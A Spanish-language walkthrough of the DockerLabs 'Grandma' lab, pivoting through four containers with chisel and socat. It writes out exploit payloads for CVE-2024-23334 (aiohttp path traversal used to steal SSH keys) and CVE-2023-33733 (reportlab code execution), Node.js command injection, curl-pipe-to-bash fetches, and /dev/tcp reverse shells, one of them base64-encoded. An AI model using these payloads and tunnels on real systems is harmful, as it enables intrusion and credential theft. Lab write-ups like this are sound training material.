---
layout: single
title: Grandma - DockerLabs
excerpt: "Grandma es una máquina de dificultad difícil de la plataforma DockerLabs. Deberemos de explotar 4 máquinas, utilizando chisel para poder pivotar entre ellas. Se tocan conceptos como tunneling con socat, varias vulnerabilidades LFI y el uso del CVE-2023-33733 que afecta a la librería reportlab de python, pudiendo ejecutar comandos remotamente en la máquina, asi como el CVE-2024-23334, que afecta al framework aiohttp."
date: 2024-09-13
classes: wide
header:
    teaser: /assets/images/grandma/grandma.png
    teaser_home_page: true
    icon: /assets/images/dl_logo.png
categories:
    - dockerlabs
    - linux
    - hard
tags:  
    - pivoting
    - CVE-2024-23334
    - CVE-2023-33733
    - tunneling
    - lfi
---

![Image](/assets/images/grandma/grandma.png)


<br>

>`Nota:`
> En el propio despligue del contenedor, nos indican las interfaces de red y la asignación de IP a cada máquina, por lo que no hay que realizar ninguna técnica de descubrimiento de hosts cuando accedamos a las máquinas.

![Image 1](/assets/images/grandma/docker.png)

## Grandma 1 (10.10.10.0/24 && 20.20.20.0/24)

<br>

# Enumeración 

<br>

```python
❯ nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 13:22 CEST
Nmap scan report for 10.10.10.2
Host is up (0.00016s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds
```

En la página web del puerto 80 no vemos nada interesante, quizás el nombre de los doctores, que pueden llegar a ser posibles usuarios del servidor 

![Image 2](/assets/images/grandma/docs.png) 

Visitando la web del puerto `5000` nos topamos con un calendario, nada interesante. Si realizamos un escaneo con nmap sobre este puerto para ver los servicios y versiones que están corriendo, vemos lo siguiente:

```python 
❯ nmap -p5000 -sCV -Pn -n 10.10.10.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 13:30 CEST
Nmap scan report for 10.10.10.2
Host is up (0.00017s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  http    aiohttp 3.9.1 (Python 3.12)
| http-title: Hospital - Calendar
|_Requested resource was /static/index.html
|_http-server-header: Python/3.12 aiohttp/3.9.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```


# Intrusión

`Aiohttp` es un framework de cliente/servidor HTTP asíncrono. Si buscamos por vulnerabilidades, nos encontramos con el `CVE-2024-23334`, el cual afecta a versiones anteriores a la 3.9.2, por lo cual es vulnerable. Se trata de una vulnerabilidad `Directory path traversal` la cual se combina con un `LFI`. A la hora de configurar el framework, la opción `follow_symlinks` se puede utilizar para determinar si se deben seguir enlaces simbólicos fuera del directorio raíz estático. Cuando 'follow_symlinks' se establece en `Verdadero`, no hay validación para verificar si la lectura de un archivo está dentro del directorio raíz. Esto puede generar vulnerabilidades de directory traversal. 

<br>

Yo voy a estar utilizando mi propio script ([Link al repo](https://github.com/s4botai/CVE-2024-23334-PoC)) para poder leer los archivos más comodamente.

![Image 3](/assets/images/grandma/lfi1.png)

Vemos que hay un usuario `drzunder`, vamos a intentar leer su clave privada para conectarnos por `shh` a la máquina.

![Image 4](/assets/images/grandma/lfi2.png) 

Copiamos la clave y nos conectamos por ssh con el usuario `drzunder` 

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa drzunder@10.10.10.2 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Aug  9 11:19:21 2024 from 172.17.0.1
drzunder@7d7902320dce:~$
```

>`Nota:`
> No se puede escalar privilegios en ninguna de las máquinas 

# Pivoting Grandma 1

<br>

Para poder tener conexión con la interfaz `20.20.20.0/24` desde nuestra máquina, debemos conectar la Grandma 1 a nuestro servidor de chisel de la siguiente manera:

```python 
// Servidor chisel
❯ ./chisel_1.10.0_linux_amd64 server --reverse -p 1234
2024/09/13 13:14:19 server: Reverse tunnelling enabled
2024/09/13 13:14:19 server: Fingerprint dnIcv9oRZ36Q9v8WKTqa3fYrBjJ5yzoNHOszO5Wa/O8=
2024/09/13 13:14:19 server: Listening on http://0.0.0.0:1234
```

```python
// Conexión a nuestro servidor
./chisel_1.10.0_linux_amd64 client 172.17.0.1:1234 R:socks & disown
[1] 124
drzunder@7d7902320dce:~$ 2024/09/13 16:55:25 client: Connecting to ws://172.17.0.1:1234
```

Si miramos en nuestro servidor de chisel, vemos que la conexión se establece correctamente 

![Image 5](/assets/images/grandma/chisel1.png) 

Añadimos el proxy creado a nuestro `/etc/proxychains.conf` y creamos el proxy en `foxyproxy` para poder acceder al posible servicio web de la siguiente máquina. 

![Image 6](/assets/images/grandma/plist1.png) 

![Image 7](/assets/images/grandma/fp1.png)

<br> 

## Grandma 2 (20.20.20.0/24 && 30.30.30.0/24)

<br>

# Enumeración 

<br>

```python
❯ proxychains nmap --top-ports 500 --open -Pn 20.20.20.3 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 17:05 CEST
Nmap scan report for 20.20.20.3
Host is up (0.0014s latency).
Not shown: 498 closed tcp ports (conn-refused)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
9000/tcp open  cslistener

Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds    
``` 

Usamos el proxy creado en `foxyproxy` para acceder al puerto 9000 en el navegador

![Image 8](/assets/images/grandma/p9000.png) 

Podemos subir un archivo `html` y la web nos lo convertirá a `pdf`

![Image 9](/assets/images/grandma/conv.png)

Vamos a capturar la petición cuando pulsamos `upload` para entender que pasa por detrás. Para eso tendremos que ir a las opciones del proxy de burpsuite y poner lo siguiente

![Image 10](/assets/images/grandma/bsuite.png) 

Lo enviamos al repeater y vemos el contenido de la respuesta

![Image 11](/assets/images/grandma/replab.png)

<br> 

# Intrusión

Para transformar el contenido del archivo html utiliza la librería de python `Report Lab`. Si buscamos por vulnerabilidades, nos encontramos con el `CVE-2023-33733` [(Link al PoC)](https://github.com/c53elyas/CVE-2023-33733). Básicamente esta librería tiene una función llamada `xhtml2pdf`, que es vulnerable a una ejecución remota de comandos mientras transforma el contenido html en pdf. Nos dejan el siguiente código: 

```python 
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

Nosotros no queremos que nos cree un archivo, asi que vamos a enviarnos una revere shell. Para ello tendremos que crear túneles con socat en la máquina `grandma1` que reediriga las conexiones, ya que la `grandma2` no tiene conectividad con nuestra máquina atacante.

<br>

Para enviarme la reverse shell utilizaré el siguiente comando:

```python 
curl http://20.20.20.2:81/shell.sh | bash
```

Expongo un archivo `shell.sh` en mi máquina host por el puerto 81 con la reverse shell

```python
 bash -i >& /dev/tcp/20.20.20.2/4141 0>&1
```

Reedirgimos la petición con curl a nuestra máquina donde está el archivo

```python 
// Reedirección de la petición con curl 
./socat TCP-LISTEN:81,fork TCP:172.17.0.1:81 & disown
```
Cuando la máquina víctima lo lea y lo ejecute, mandará la shell a la 20.20.20.2 por el puerto 4141, así que reedirigimos la shell a nuestra máquina hacia un puerto en el que estemos en escucha

```python
//Reedirección de la shell 
./socat TCP-LISTEN:4141,fork TCP:172.17.0.1:4141 & disown
```
Enviamos el payload y nos llega la shell 

![Image 12](/assets/images/grandma/payload.png)


![Image 13](/assets/images/grandma/g2shell.png) 

<br> 

# Pivoting grandma 2 

Para poder tener conectividad con la interfaz `30.30.30.0/24`, nos conectaremos a nuestro servidor de chisel desde la grandma2. Para ello, tendremos que crear un túnel en la grandma1 que reediriga la conexión a nuestro servidor chisel. 

```python 
// Grandma2 client 
./chisel_1.10.0_linux_amd64 client 20.20.20.2:999 R:8888:socks & disown
```

```python 
// Chisel connection Redirect in Grandma 1 
./socat TCP-LISTEN:999,fork TCP:172.17.0.1:1234 & disown
```

Como vemos, la conexión se realiza exitosamente a nuestro servidor chisel 

![Image 14](/assets/images/grandma/chisel2.png) 

Añadimos el proxy creado a nuestro `/etc/proxychains.conf` y a `foxyproxy`. 

<br> 

## Grandma 3 (30.30.30.0/24 && 40.40.40.0/24) 

<br> 

# Enumeración 

```python 
❯ proxychains nmap --top-ports 500 --open -Pn 30.30.30.3 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 19:44 CEST
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 96.80% done; ETC: 19:45 (0:00:02 remaining)
Nmap scan report for 30.30.30.3
Host is up (0.14s latency).
Not shown: 498 closed tcp ports (conn-refused)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 68.08 seconds
```

Nos metemos en la web y nos encontramos una página completamente en blanco, tampoco hay nada en el código fuente 

![Image 15](/assets/images/grandma/white.png) 

Interceptamos la petición a la página web con burpsuite, haciendo lo mismo que la vez anterior, pero cambiando ahora el puerto del proxy que conecta con la inerfaz `30.30.30.0/24` 

![Image 16](/assets/images/grandma/bsuite2.png) 

Intercpetando la petición, vemos que se esta añadiendo una cookie encriptada en lo que parece ser base64. 

![Image 17](/assets/images/grandma/cookie.png)

<br> 

# Intrusión 

La desencriptamos con el `bursuite decoder` y vemos que es simplemente un valor que le asigna 

![Image 18](/assets/images/grandma/decoded1.png) 

Vamos a probar a leer un archivo interno de la máquina con un `path traversal` encodeando el payload en base64 y pasándoselo a la cookie 

![Image 19](/assets/images/grandma/base64.png) 

![Image 20](/assets/images/grandma/node.png) 

Vemos que funciona, y que hay un usuario llamado `node`, vamos a intentar leer su clave privada 

![Image 21](/assets/images/grandma/node_key.png) 

Copiamos la clave y nos logeamos por ssh por el puerto `2222` 

```python 
❯ proxychains ssh -i g3_rsa node@30.30.30.3 -p 2222
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-30.30.30.3:2222-<><>-OK
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Sep 13 19:39:50 2024 from 30.30.30.2
node@a316ce03e2e0:~$
``` 

<br> 

# Pivoting grandma 3 

Para tener conectividad con la interfaz `40.40.40.0/24` desde nuestra máquina, vamos a tener que reedirigir la conexión de chisel a la grandma 2, y de la grandma 2 a la 1 hasta la nuestra 

```python 
// Grandma 3 chisel client 
./chisel_1.10.0_linux_amd64 client 30.30.30.2:4343 R:7777:socks & disown
```

```python
// Grandma 2 chisel redirection 
 ./socat TCP-LISTEN:4343,fork TCP:20.20.20.2:4343 & disown    
```

```python 
// Grandma 1 chisel redirection
./socat TCP-LISTEN:4343,fork TCP:172.17.0.1:1234 & disown
```

Vemos que se conecta correctamente 

![Image 22](/assets/images/grandma/chisel3.png) 

Añadimos el nuevo proxy creado a `/etc/proxychains.conf` y a `foxyproxy` 

<br> 

## Grandma 4 (40.40.40.0/24) 

<br> 

# Enumeración 

```python 
❯ proxychains nmap --top-ports 500 --open -Pn 40.40.40.3 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 20:28 CEST
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 97.60% done; ETC: 20:29 (0:00:02 remaining)
Nmap scan report for 40.40.40.3
Host is up (0.14s latency).
Not shown: 499 closed tcp ports (conn-refused)
PORT     STATE SERVICE
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 70.22 seconds 
```

Visitando el puerto 9999, nos dice que solo acepta peticiones por `POST`

![Image 23](/assets/images/grandma/post.png) 

Enviamos la petición por post con curl y vemos lo siguiente 

```python 
❯ proxychains curl -s -X POST "http://40.40.40.3:9999"
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:7777-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:7777-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:7777-<><>-40.40.40.3:9999-<><>-OK
{"message":"POST request received","users":[{"id":1,"name":"DrZunder"},{"id":2,"name":"DrMario"},{"id":3,"name":"App"},{"id":4,"name":"Node"},{"id":"Error","name":"Command error"}]}%  
```

Ese mensaje de error indica que la web esta deserializando el contenido JSON de manera insegura, asi que vamos a probar a inyectar un comando 

```python
❯ proxychains curl -s -X POST "http://40.40.40.3:9999" -H 'Content-Type: application/json' -d '{"id": "require(\"child_process\").execSync(\"id\").toString()"}'
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:7777-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:7777-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:7777-<><>-40.40.40.3:9999-<><>-OK
{"message":"POST request received","users":[{"id":1,"name":"DrZunder"},{"id":2,"name":"DrMario"},{"id":3,"name":"App"},{"id":4,"name":"Node"},{"id":"Error","name":"Command error"}],"result":"uid=0(root) gid=0(root) groups=0(root)\n"}
```

<br> 

# Intrusión

Tenemos ejecución remota de comandos, vamos a enviarnos la última shell que será redirigida con socat por todas las máquinas anteriores 

```python 
❯ echo "bash -i >& /dev/tcp/40.40.40.2/666 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC80MC40MC40MC4yLzY2NiAwPiYxCg==
```

```python 
// Payload 
❯ proxychains curl -s -X POST "http://40.40.40.3:9999" -H 'Content-Type: application/json' -d '{"id": "require(\"child_process\").execSync(\"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC80MC40MC40MC4yLzY2NiAwPiYxCg=='|base64 -d|bash\").toString()"}'
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:7777-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:7777-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:7777-<><>-40.40.40.3:9999-<><>-OK
```
```python
// Shell redirect grandma 3 --> grandma 2 
./socat TCP-LISTEN:666,fork TCP:30.30.30.2:666 & disown
```

```python 
// Shell redirect grandma 2 --> grandma 1 
./socat TCP-LISTEN:666,fork TCP:20.20.20.2:666 & disown
```

```python 
// Shell redirect grandma 1 --> Attackers machine 
./socat TCP-LISTEN:666,fork TCP:172.17.0.1:4444 & disown
```

Nos llega la shell y completamos el laboratorio 

![Image 24](/assets/images/grandma/root.png)
